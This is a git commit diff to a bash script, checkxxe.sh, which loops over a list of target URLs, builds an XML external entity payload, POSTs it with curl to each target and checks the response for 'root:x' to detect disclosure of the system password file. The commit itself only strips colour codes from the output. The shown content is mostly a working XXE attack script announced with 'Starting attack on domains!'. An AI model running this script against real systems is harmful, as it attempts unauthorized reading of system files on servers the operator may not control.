76c0c97a891d588420080e93316963bb98ca0906
Jordy Zomer <zome8499@student.alfa-college.nl>
2017-11-29 12:30:13 +0100

    Update checkxxe.sh

--- checkxxe.sh
+++ checkxxe.sh
@@ -1,15 +1,15 @@
 #!/bin/bash
 
-test -e targets.txt || echo -e "\e[91mTarget file not found :("
-test -e xml.txt || echo -e "\e[93mXML file not found, no worries it will be made! :D" 
+test -e targets.txt || echo "Target file not found :("
+test -e xml.txt || echo "XML file not found, no worries it will be made! :D" 
 
 time while read -r target; do
 
 
-    echo "\e[93mPreparing script.. "
+    echo "Preparing script.. "
 
     if [ -f xml.txt ]; then
-        echo -e "\e[32mPayload Exists! "
+        echo "Payload Exists! "
     else
         cat <<- XMLFILE >> "xml.txt"
 	<!DOCTYPE foo [
@@ -21,9 +21,9 @@ time while read -r target; do
     echo "Starting attack on domains!"
 
     if curl -s -d @xml.txt --header "Content-Type: application/xml;charset=UTF-8" "$target" | grep -q "root:x"; then
-        echo -e "\e[91mTarget $target might be vulnerable to XXE."
+        echo "Target $target might be vulnerable to XXE."
     else
-        echo -e "\e[32mTarget $target is not vulnerable to XXE."
+        echo "Target $target is not vulnerable to XXE."
     fi
 
 done < targets.txt
